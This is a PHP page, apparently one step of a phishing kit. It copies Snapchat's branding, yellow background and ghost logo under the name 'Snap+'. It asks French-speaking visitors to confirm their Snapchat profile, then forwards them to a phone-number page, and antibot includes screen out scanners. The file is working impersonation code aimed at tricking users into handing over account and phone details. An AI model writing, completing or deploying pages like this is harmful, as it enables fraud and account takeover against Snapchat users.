<?php

declare(strict_types=1);

require __DIR__ . '/includes/bootstrap.php';
require __DIR__ . '/includes/antibot.php';

session_start();

$flowId = isset($_SESSION['flow_id']) ? (string) $_SESSION['flow_id'] : '';
$secret = isset($_SESSION['flow_secret']) ? (string) $_SESSION['flow_secret'] : '';
$flow = ($flowId !== '' && $secret !== '') ? app_flow_read($flowId) : null;

if ($flow === null || $flow['secret'] !== $secret) {
    header('Location: index.php', true, 302);
    exit;
}

$pseudo = $flow['pseudo'];
$display = '@' . ltrim($pseudo, '@');
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    app_touch_form_opened('confirm');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ab = app_antibot_verify_post_light('confirm', 0.8);
    if ($ab !== '') {
        $error = $ab;
    } else {
        $action = isset($_POST['action']) ? (string) $_POST['action'] : '';
        if ($action === 'oui') {
            header('Location: phone.php', true, 302);
            exit;
        }
        if ($action === 'non') {
            app_flow_delete($flowId);
            unset($_SESSION['flow_id'], $_SESSION['flow_secret']);
            header('Location: index.php', true, 302);
            exit;
        }
    }
}

$pageBackground = '#FFFC00';
$css = require __DIR__ . '/includes/snap_styles.php';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmer votre profil — Snap+</title>
    <style><?= $css ?></style>
</head>
<body>
    <div class="card">
        <?php require __DIR__ . '/includes/partials_snap_brand.php'; ?>
        <h1 class="title">Confirmez votre profil</h1>
        <p class="subtitle">Est-ce bien votre profil Snapchat ?</p>

        <?php if ($error !== '') : ?>
            <div class="alert alert-error" role="alert"><?= htmlspecialchars($error, ENT_QUOTES, 'UTF-8') ?></div>
        <?php endif; ?>

        <div class="profile-box">
            <div class="snapcode" aria-hidden="true">
                <svg class="snap-ghost" viewBox="0 0 108 108" xmlns="http://www.w3.org/2000/svg" focusable="false">
                    <path fill="#FFFFFF" stroke="#000000" stroke-width="2.8" stroke-linejoin="round" d="M54 12c-21.5 0-37 16.2-37 36.2 0 7.8 2.6 15 7 20.2-7.2 6.8-11 15.4-11 19.6h82c0-4.2-3.8-12.8-11-19.6 4.4-5.2 7-12.4 7-20.2C91 28.2 75.5 12 54 12z"/>
                    <path fill="none" stroke="#000000" stroke-width="2.4" stroke-linecap="round" d="M40 58c4.5 7 9.8 11 14 11s9.5-4 14-11"/>
                </svg>
            </div>
            <p class="pseudo-chip" style="margin:0"><?= htmlspecialchars($display, ENT_QUOTES, 'UTF-8') ?></p>
        </div>

        <form method="post" action="">
            <?php $requireMath = false;
            require __DIR__ . '/includes/form_antibot_fields.php'; ?>
            <button type="submit" class="btn btn-primary" name="action" value="oui">OUI</button>
            <button type="submit" class="btn btn-secondary" name="action" value="non">NON</button>
        </form>
    </div>
</body>
</html>
